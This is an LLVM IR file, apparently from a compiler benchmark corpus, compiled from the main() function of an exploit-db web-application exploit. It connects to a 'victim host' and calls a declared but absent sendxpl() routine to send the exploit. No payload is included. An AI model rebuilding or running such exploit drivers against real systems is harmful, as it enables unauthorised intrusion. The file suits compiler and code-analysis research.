; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/cgi/webapps/extr_840.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/cgi/webapps/extr_840.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { i32, i32, i32 }
%struct.hostent = type { i32, i32 }
%struct.sockaddr = type { i32 }

@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [6 x i8] c"clear\00", align 1
@.str.1 = private unnamed_addr constant [35 x i8] c"[*] Creating socket          [OK]\0A\00", align 1
@.str.2 = private unnamed_addr constant [35 x i8] c"[*] Resolving victim host    [OK]\0A\00", align 1
@PORT = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [38 x i8] c"[*] Connecting at victim host   [OK]\0A\00", align 1
@.str.4 = private unnamed_addr constant [2 x i8] c"a\00", align 1
@.str.5 = private unnamed_addr constant [35 x i8] c"[*] Sending exploit          [OK]\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %struct.sockaddr_in, align 4
  %11 = alloca %struct.hostent*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %12 = load i32, i32* %4, align 4
  %13 = icmp ne i32 %12, 5
  br i1 %13, label %14, label %16

14:                                               ; preds = %2
  %15 = call i32 (...) @info()
  br label %16

16:                                               ; preds = %14, %2
  %17 = load i8**, i8*** %5, align 8
  %18 = getelementptr inbounds i8*, i8** %17, i64 4
  %19 = load i8*, i8** %18, align 8
  %20 = call i32 @atoi(i8* %19)
  store i32 %20, i32* %9, align 4
  %21 = load i32, i32* %9, align 4
  %22 = icmp slt i32 %21, 0
  br i1 %22, label %26, label %23

23:                                               ; preds = %16
  %24 = load i32, i32* %9, align 4
  %25 = icmp sgt i32 %24, 3
  br i1 %25, label %26, label %28

26:                                               ; preds = %23, %16
  %27 = call i32 (...) @info()
  br label %28

28:                                               ; preds = %26, %23
  %29 = load i32, i32* @AF_INET, align 4
  %30 = load i32, i32* @SOCK_STREAM, align 4
  %31 = call i32 @socket(i32 %29, i32 %30, i32 0)
  store i32 %31, i32* %7, align 4
  %32 = icmp slt i32 %31, 0
  br i1 %32, label %33, label %35

33:                                               ; preds = %28
  %34 = call i32 (...) @errsock()
  br label %35

35:                                               ; preds = %33, %28
  %36 = call i32 @system(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str, i64 0, i64 0))
  %37 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.1, i64 0, i64 0))
  %38 = load i8**, i8*** %5, align 8
  %39 = getelementptr inbounds i8*, i8** %38, i64 1
  %40 = load i8*, i8** %39, align 8
  %41 = call %struct.hostent* @gethostbyname(i8* %40)
  store %struct.hostent* %41, %struct.hostent** %11, align 8
  %42 = icmp eq %struct.hostent* %41, null
  br i1 %42, label %43, label %45

43:                                               ; preds = %35
  %44 = call i32 (...) @errgeth()
  br label %45

45:                                               ; preds = %43, %35
  %46 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.2, i64 0, i64 0))
  %47 = call i32 @memset(%struct.sockaddr_in* %10, i32 0, i32 12)
  %48 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  %49 = bitcast i32* %48 to i8*
  %50 = load %struct.hostent*, %struct.hostent** %11, align 8
  %51 = getelementptr inbounds %struct.hostent, %struct.hostent* %50, i32 0, i32 1
  %52 = load i32, i32* %51, align 4
  %53 = load %struct.hostent*, %struct.hostent** %11, align 8
  %54 = getelementptr inbounds %struct.hostent, %struct.hostent* %53, i32 0, i32 0
  %55 = load i32, i32* %54, align 4
  %56 = call i32 @memcpy(i8* %49, i32 %52, i32 %55)
  %57 = load i32, i32* @AF_INET, align 4
  %58 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  store i32 %57, i32* %58, align 4
  %59 = load i32, i32* @PORT, align 4
  %60 = call i32 @htons(i32 %59)
  %61 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  store i32 %60, i32* %61, align 4
  %62 = load i32, i32* %7, align 4
  %63 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %64 = call i32 @connect(i32 %62, %struct.sockaddr* %63, i32 12)
  store i32 %64, i32* %8, align 4
  %65 = load i32, i32* %8, align 4
  %66 = icmp slt i32 %65, 0
  br i1 %66, label %67, label %69

67:                                               ; preds = %45
  %68 = call i32 (...) @errconn()
  br label %69

69:                                               ; preds = %67, %45
  %70 = load i8**, i8*** %5, align 8
  %71 = getelementptr inbounds i8*, i8** %70, i64 1
  %72 = load i8*, i8** %71, align 8
  %73 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.3, i64 0, i64 0), i8* %72)
  %74 = load i32, i32* %7, align 4
  %75 = call i32* @fdopen(i32 %74, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.4, i64 0, i64 0))
  store i32* %75, i32** %6, align 8
  %76 = load i32*, i32** %6, align 8
  %77 = call i32 @setbuf(i32* %76, i32* null)
  %78 = load i32*, i32** %6, align 8
  %79 = load i8**, i8*** %5, align 8
  %80 = load i32, i32* %9, align 4
  %81 = call i32 @sendxpl(i32* %78, i8** %79, i32 %80)
  %82 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.5, i64 0, i64 0))
  %83 = load i32, i32* %7, align 4
  %84 = load i8**, i8*** %5, align 8
  %85 = call i32 @readout(i32 %83, i8** %84)
  %86 = load i32, i32* %7, align 4
  %87 = call i32 @shutdown(i32 %86, i32 2)
  %88 = load i32, i32* %7, align 4
  %89 = call i32 @close(i32 %88)
  %90 = load i32*, i32** %6, align 8
  %91 = call i32 @fclose(i32* %90)
  ret i32 0
}

declare dso_local i32 @info(...) #1

declare dso_local i32 @atoi(i8*) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @errsock(...) #1

declare dso_local i32 @system(i8*) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local %struct.hostent* @gethostbyname(i8*) #1

declare dso_local i32 @errgeth(...) #1

declare dso_local i32 @memset(%struct.sockaddr_in*, i32, i32) #1

declare dso_local i32 @memcpy(i8*, i32, i32) #1

declare dso_local i32 @htons(i32) #1

declare dso_local i32 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @errconn(...) #1

declare dso_local i32* @fdopen(i32, i8*) #1

declare dso_local i32 @setbuf(i32*, i32*) #1

declare dso_local i32 @sendxpl(i32*, i8**, i32) #1

declare dso_local i32 @readout(i32, i8**) #1

declare dso_local i32 @shutdown(i32, i32) #1

declare dso_local i32 @close(i32) #1

declare dso_local i32 @fclose(i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
